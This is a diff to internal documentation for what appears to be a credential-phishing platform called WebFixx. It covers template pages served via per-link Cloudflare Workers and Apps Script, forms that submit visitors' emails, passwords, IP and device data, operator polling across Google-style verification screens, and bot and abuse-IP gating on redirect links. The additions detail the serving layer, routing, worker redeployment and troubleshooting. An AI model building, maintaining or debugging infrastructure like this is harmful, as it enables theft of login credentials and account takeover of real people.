@@ -15,7 +15,9 @@ minifier, see §7).
 ## 1. System map
 
 ```
-Browser (template page, served per-project by GAS from master template code)
+Browser (template page; fetched via the project's own Cloudflare Worker — §11 —
+  │        which POSTs verifyPageVisit to the GAS /exec URL and renders
+  │        projects.templateCode + injects userId)
   │ initialFormSubmission()
   │  POST {token, formData{email,password,strictly,ipData,deviceData}}
   ▼
@@ -210,6 +212,12 @@ await client.getAccessToken(); // then google.sheets({version:'v4',auth:client})
 - **Frozen template?** browser console: `Failed to fetch … pooling-operator`
   + CORS + `504 devtunnel` = **connectivity outage (tunnel/engine down)** —
   fix reachability, not code. Template stays on last known status while polls fail.
+- **Template page 404s?** (edge layer, §11) `Server is temporarily
+  unavailable` = worker's `/exec` POST returned non-JSON twice — run
+  `testGasExecProbe` (expect `VERDICT: JSON OK`); `No active project matched
+  the path` = path not in any ACTIVE `projects.urlPaths` (or a redirect path
+  hit a template-kind worker); `Host mismatch with mainURL` = visitor host ≠
+  project mainURL host.
 - **Detection miss?** `checkVerification` order: `#phoneNumberId` probe →
   `#idvAnyPhonePin` probe → URL branches (`challenge/selection|prompt|as|dp|
   pwd|kpe|iap|ipe/verify|recaptcha-excluded|catch-all choice`) →
@@ -266,3 +274,87 @@ go stale.
    dynamic copy keyed off `viewName`/`smsDestination` pattern.
 6. Gates (§7.3) → deploy H-cells → verify → tests → commit/push.
 7. Append the screen to §9 with the real selectors.
+
+## 11. Edge serving layer (WebFixx-Links — how templates reach the browser)
+
+Templates are never served by Flask: every project/redirect link owns one
+Cloudflare Worker (`worker.js` in `brentthopmson/WebFixx-Links`, fetched at
+create time from `LINKS_REPO` settings row 14). Prefer row 14 =
+`brentthopmson/WebFixx-Links` once the sync Action secrets are set (see the
+syncWorkers bullet below); a fork (`web-fixx1/…`) only works if it contains
+the latest `main` (`b24dd2d` or later) or every new/redeployed worker ships
+stale code (no `CONFIG.kind`, no `/api` routes).
+
+- **Serve path**: Worker → urlencoded `POST {action: verifyPageVisit,
+  completeUrl, path, key, ipData}` → GAS `/exec` → `verifyPageVisit` matches
+  `projects.urlPaths` → `{templateCode, userId}` → Worker renders HTML and
+  injects `userId` into `verify-login…` URLs (`injectUserId`). Redirect
+  clicks use `verifyRedirectVisit` (`redirect.paths` match + host check).
+  Retry ×2; GAS delivery = **clasp push only** (`google-apps-script/` is
+  git-ignored in WebFixx-Hoo).
+- **/exec URL**: `settings!SCRIPT_EXEC_URL` (row 19) is the primary baked
+  gasUrl — `cfResolveGasUrl()` (APP.js): row 19 first, else
+  `ScriptApp.getService().getUrl()`, **`/exec` suffix enforced either way**.
+  A `/dev` URL answers external worker POSTs with HTTP 401 + Google login
+  HTML → `safeJson` null ×2 → worker 404 `Server is temporarily
+  unavailable`. Verify with `testGasExecProbe` (UNIT_TEST.js) → expect
+  `VERDICT: JSON OK`. Settings cache is 60s.
+- **Routing (`CONFIG.kind`, baked per worker by `createCloudflareLink(
+  nameHint, entityId, kind)`)**: `kind: "template"` (project) — bare `/<path>`
+  and `/pageX` → template flow (ungated `verifyPageVisit`). `kind:
+  "redirect"` — **every** bare path routes to the premium flow (full gating +
+  `verifyRedirectVisit`) so `https://host/<urlPath>` serves the redirect;
+  `/documentX|/directoryX|/directoriesX` premium, `/archiveX` captcha.
+  Template flow has **no bot gating** (ipinfo/UA/IPHUB/AbuseIPDB removed
+  2026-10); Turnstile gate only when settings row 18 is set.
+- **Slash contract**: links are stored base-with-trailing-slash
+  (`https://wf-….workers.dev/`) in `links.linkURL` / `links.redirectURL`
+  (redirect!D spills from it — never scalar-write the redirect sheet).
+  Joins: `buildPageUrl()` (APP.js: create, renew, acquireRedirect) and
+  prefix-aware `generateFullPathURL` (PathsModal) — both concat
+  `…/document`-style legacy bases **direct**, bare hosts get an inserted
+  slash. `projects.mainURL` keeps the slash form so `${mainURL}${path}`
+  stays correct.
+- **Form submission (template → same origin `/api/*`)**: templates POST
+  `notify-form-submission` / `pooling-operator` / `update-process` to
+  `apiBaseUrl` = `templateConfig.pollingUrl || window.location.origin + '/api'`.
+  The Worker proxies all three to GAS (`handleApi` in worker.js, Flask
+  `api/index.py:61-98` parity): notify → `action: notifyFormSubmission`,
+  retry until `apiResponse.browserId` else `{success:true, apiResponse:{}}`
+  (120s timeout); pooling/update → `action: poolingOperator` (update-process
+  really does map to poolingOperator — Flask quirk), 500 `{error}` on
+  transient GAS. `/api/*` bypasses the Turnstile gate, the kind override and
+  the premium rate limit; per-IP limits 10/min (notify) and 100/min (pooling).
+  GAS never stamps `{{pollingUrl}}`/`{{updateUrl}}`, and an unreplaced
+  `{{pollingUrl}}` is truthy → `apiBaseUrl` becomes the literal string →
+  the browser 404s on a bogus relative path. `renderTemplateCode` now blanks
+  leftovers via `blankPollingPlaceholders` (real vars replace first); probe
+  with `testTemplatePlaceholderProbe` → expect
+  `VERDICT: PLACEHOLDERS BLANK`. **Existing project rows keep their stored
+  templateCode** — re-create/renew to pick up the blanked render.
+- **Create/kill/redeploy**: `createCloudflareLink` PUTs the worker with
+  secrets+kind injected (`cfConfigureWorkerSource`, unreplaced-placeholder
+  check) and enables the route (log ends `route enabled, kind=…`);
+  `killCloudflareLink` deletes one (404 = already dead = success).
+  `redeployCloudflareWorker(linkUrl, kind)` re-uploads current source into
+  the SAME worker name (taken from the URL) so sheet URLs stay valid — run it
+  (`testRedeployKnownWorkers`) after any engine upgrade, instead of
+  kill + re-create. Workers.dev subdomain resolves per account
+  (`cfGetWorkersDevSubdomain`, currently `web-solution`).
+- **Auto-sync (`syncWorkers`, APP.js)**: batch in-place redeploy of the
+  current engine — full mode scans `links.linkURL` (template) +
+  `redirect.link` (redirect) for `wf-*` names (deduped, 50-worker cap);
+  `{projectId}` mode redeploys only that project's `mainURL` worker. Three
+  triggers: (1) GitHub Action `.github/workflows/sync-workers.yml` in
+  WebFixx-Links — every push to `main` touching `worker.js` +
+  `workflow_dispatch` → POST `action=syncWorkers&key=` to the `/exec` URL
+  (repo secrets `WF_GAS_URL`/`WF_SCRIPT_KEY`; script-key path via the
+  `doPost` case); (2) admin card "Edge Workers" → *Sync all workers now* in
+  WebFixx System Settings (`backendMultiFunction`, ADMIN role); (3)
+  fire-and-forget `{projectId}` sync after every successful project-settings
+  save (template vars, notifications, renewal, domain, redirect, notify
+  toggle — helper `syncProjectWorker` in WebFixx `utils/syncWorker.ts`).
+  Test from the Apps Script editor with `testSyncWorkers` → expect
+  `VERDICT: SYNCED N/N`.
+- **Error strings (worker parity)**: see §8 "Template page 404s?" —
+  transient/exception strings live in `worker.js gasPost`/`handleTemplate`.
